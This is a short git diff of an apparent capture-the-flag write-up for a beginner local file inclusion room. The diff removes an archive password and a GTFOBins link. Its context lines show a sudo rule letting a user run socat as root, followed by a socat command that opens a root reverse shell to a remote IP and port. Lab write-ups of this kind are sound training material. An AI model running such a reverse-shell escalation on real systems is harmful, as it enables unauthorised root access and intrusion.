@@ -11,10 +11,6 @@ A beginner level LFI challenge
 - Brute Forcing Hash
 - Misconfigured Binaries
 
-## Appendix archive
-
-Password: `1 kn0w 1 5h0uldn'7!`
-
 ## Task 1 Deploy
 
 This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.
@@ -165,8 +161,6 @@ Matching Defaults entries for falconfeast on inclusion:
 User falconfeast may run the following commands on inclusion:
     (root) NOPASSWD: /usr/bin/socat
 ```
-
-[https://gtfobins.github.io/gtfobins/socat/#sudo](https://gtfobins.github.io/gtfobins/socat/#sudo)
 
 ```
 falconfeast@inclusion:~$ sudo socat tcp-connect:10.8.106.222:9001 exec:sh,pty,stderr,setsid,sigint,sane
